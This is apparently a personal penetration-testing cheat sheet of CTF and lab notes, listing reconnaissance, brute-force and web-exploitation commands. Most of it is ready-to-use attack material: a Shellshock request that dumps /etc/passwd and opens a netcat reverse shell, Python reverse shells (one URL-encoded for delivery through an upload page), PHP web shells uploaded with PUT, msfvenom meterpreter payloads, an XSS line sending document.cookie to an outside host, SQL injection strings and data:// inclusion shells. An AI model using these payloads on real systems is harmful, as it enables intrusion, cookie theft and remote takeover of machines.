Info Gather

CTF Mantra 
"Either you don't have all the ports = nmap more, 
or you do have all the ports = google more."

Clean up html parse
grep "href=" index.html | cut -d "/" -f 3 | grep "\." | cut -d '"' -f 1 | sort -u

for url in $(cat list.txt); do host $url; done

Nmap order
nmap [ip] --top-ports 10
nmap [ip] --top-ports 100
nmap [ip] --top-ports 2000
nmap [ip] -sV -A
nmap [ip] -sV -A -p-
nmap [ip] -sU [specific ports 53, 69, 161, 137]

Nmap (-T1/4) - unicornscan - sparta - nc - nikto (loud) - curl(http) - onesixtyone - enum4linux - burp spider - dirb
 - unicornscan 10.11.1.226 -mU -r200 -I
Always nmap -p-
 SNMP WALK/onesixtyone
     ./snmpenum.pl 192.168.1.101 public windows.txt
 nmap --proxy http://192.168.25.144 -T5 -A -v -sT -Pn 127.0.0.1
 
 
ls -lh /usr/share/nmap/scripts/*ssh* or other service name to see scripts.
root@kali:~# nmap 10.11.1.220 --script=smb* -p 445

nmap 10.11.1.73 -p 5800 --script vnc-info



Set browser proxy - target ip and port.
browse to localhost. 
do your thing
root@kali:~# dirb http://localhost -p 192.168.25.144:3128
then wget through proxy
wget -e use_proxy=yes -e http_proxy=192.168.23.131:3128 http://localhost/connect
nikto -useproxy 192.168.23.131:3128 -h http://localhost/wolfcms
curl -v -X OPTIONS  (check for uploads)
curl -X PUT -d '<?php system($_GET["c"]);' http://192.168.56.103/test/1.php


always check robots.txt
Always check ftp - anonymous

Nmap -f (fragment)

SMB
smbclient //192.168.25.146/EricsSecretStuff -u anonymous
Looking for readable and dear lord maybe even writable shares
root@kali:~# smbclient //10.11.1.128/wwwroot -u guest


FUZZING
wfuzz -c --hw 87 -z file,/usr/share/seclists/Discovery/Web_Content/common.txt 192.168.25.165:60080/?page=FUZZ

HTTP CGI-BIN (Shellshock)
cgi-bin/status

When we have this - try this html header

$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80

cheeky shell
root@kali:~# echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -nv 192.168.25.132 443 -e /bin/bash&&echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.25.158 80

Python shell from CMD

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.30.31",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'v

html encoded below

http://localhost/wolfcms/public/upload.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket%28socket.AF_INET,socket.SOCK_STREAM%29;s.connect%28%28%22192.168.23.129%22,443%29%29;os.dup2%28s.fileno%28%29,0%29;%20os.dup2%28s.fileno%28%29,1%29;%20os.dup2%28s.fileno%28%29,2%29;p=subprocess.call%28[%22/bin/sh%22,%22-i%22]%29;%27
If it's Wordpress , run wpscan! Wpscan -u http://address -e vp -e ap -e t -e u[1-100]

mysql -u root -p -h 192.168.25.140

hydra -t 10 -V -f -l root -x 4:6:a ftp://192.168.67.132
So by using "-sV" and "--script=ssh-hostkey", we can automate the banner grabbing as well as key fingerprints.


Hydra -l username -e nsr (ip range).   Does a combination of usernames reversed ect 


PHP Command injection
eg. Normal parameter = 1234
PHP injection = 1234;phpinfo()
or even better - system commands
= 1234;system("id")

Null byte injections

When you are attempting to download things from the site, and only certain doc types are downloadable, you can throw in a null byte to bypass these controls. 

try %00 or %2500 which is the url encoded null byte

eg GET /ftp.coupons2013.md.bak
Unable
GET /ftp.coupons2013.md.bak%2500.pdf
OK!


Python Shell Trick

python -c 'import pty;pty.spawn("/bin/bash")'


export PATH=/usr/bin:/bin
ONE LINE SHELL
<?php echo shell_exec($_GET['cmd']);?>

msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.phpcat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php


Try SQL Injections both with the original parameter and without
ie
page=1 ' or 1=1
page=' or 1=1
https://www.exploit-db.com/papers/12975/
Also try with html encoding the spaces eg
page='union %20 all %20 select %20 1,2,3,4 %20from %20 information_schema.tables--


XSS

<script>new Image().src="http://10.11.0.224:81/bogus.php?output="+document.cookie;</script>

# simple RFI page=data://text/plain, <?php system("whoami");?>  # base64 encoded RFI page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTs/Pg==  # mini shell page=data://text/plain,<?php system($_GET[cmd]);?>&cmd=id  # base64 + URL encoded mini shell (didn't work without URL encoding) page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8%2B&cmd=id


Metasploit Best Practice

Remember to check targets, payloads and other options
autoroute add -s 10.10.10.0/24 (or whatever subnet target machine sits on)
Windows priv esc metasploit exploit suggester





